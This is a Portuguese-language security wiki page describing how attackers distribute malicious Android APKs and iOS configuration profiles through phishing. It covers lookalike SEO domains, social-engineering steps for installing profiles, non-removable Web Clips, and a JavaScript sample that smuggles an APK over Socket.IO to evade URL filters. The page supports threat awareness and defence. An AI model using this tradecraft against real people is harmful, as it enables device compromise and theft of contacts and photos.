# Phishing Mobile e Distribuição de Apps Maliciosos (Android e iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página aborda técnicas usadas por agentes de ameaças para distribuir **APKs Android maliciosos** e **perfis de configuração móvel do iOS** por meio de phishing (SEO, engenharia social, lojas falsas, apps de namoro etc.).
> O material foi adaptado da campanha SarangTrap, exposta pela Zimperium zLabs (2025), e de outras pesquisas públicas.<sup>[[1]](#references)</sup>

## Fluxo do Ataque

1. **Infraestrutura de SEO/Phishing**
   * Registrar dezenas de domínios parecidos (namoro, compartilhamento na nuvem, serviço automotivo…).
     – Usar palavras-chave e emojis no idioma local no elemento `<title>` para obter uma boa classificação no Google.
     – Hospedar instruções de instalação para *Android* (`.apk`) e iOS na mesma landing page.
2. **Download do Primeiro Estágio**
   * Android: link direto para um APK *não assinado* ou de “loja de terceiros”.
   * iOS: link `itms-services://` ou HTTPS simples para um perfil **mobileconfig** malicioso (veja abaixo).
3. **Comportamento do Android Após a Instalação**
   * Execução controlada por C2, abuso de permissões, bypasses de dropper, coleta em segundo plano e outros comportamentos de malware após a instalação são abordados na página dedicada sobre Android Malware Post-Exploitation abaixo.
4. **Técnica de Entrega para iOS**
   * Um único **perfil de configuração móvel** pode solicitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. para inscrever o dispositivo em uma supervisão semelhante a “MDM”.
   * Instruções de engenharia social:
     1. Abrir Ajustes ➜ *Perfil Baixado*.
     2. Tocar em *Instalar* três vezes (com capturas de tela na página de phishing).
     3. Confiar no perfil não assinado ➜ o atacante obtém os privilégios de *Contatos* e *Fotos* sem revisão da App Store.
5. **Payload Web Clip do iOS (ícone de app de phishing)**
   * Payloads `com.apple.webClip.managed` podem **fixar um URL de phishing na Tela de Início** com um ícone/rótulo personalizado.
   * Web Clips podem ser executados em **tela cheia** (ocultando a interface do navegador) e marcados como **não removíveis**, forçando a vítima a excluir o perfil para remover o ícone.<sup>[[3]](#references)</sup>
6. **Camada de Rede**
   * HTTP simples, geralmente na porta 80, com um cabeçalho HOST como `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sem TLS → fácil de detectar).

## Android Malware Post-Exploitation

Para tradecraft de malware Android após a instalação, como C2, abuso de Accessibility, overlays, automação de ATS, carregamento de DEX em etapas, SMS premium e persistência, consulte:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling com Socket.IO/WebSocket + Páginas Falsas do Google Play

Os atacantes estão substituindo cada vez mais os links estáticos para APKs por um canal Socket.IO/WebSocket incorporado em iscas que imitam o Google Play. Isso oculta o URL do payload, contorna filtros de URL/extensão e mantém uma experiência de instalação realista.<sup>[[2]](#references)[[4]](#references)</sup>

Fluxo típico do cliente observado em ataques reais:

<details>
<summary>Downloader falso do Play com Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Por que isso contorna controles simples:
- Nenhuma URL estática do APK é exposta; o payload é reconstruído na memória a partir de frames WebSocket.
- Filtros de URL/MIME/extensão que bloqueiam respostas diretas de .apk podem não detectar dados binários encapsulados via WebSockets/Socket.IO.
- Crawlers e sandboxes de URL que não executam WebSockets não recuperarão o payload.

Veja também tradecraft e ferramentas de WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [O lado obscuro do romance: campanha de extorsão SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Configurações de payload de Web Clips para dispositivos Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Trojan bancário que tem como alvo usuários de Android da Indonésia e do Vietnã](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
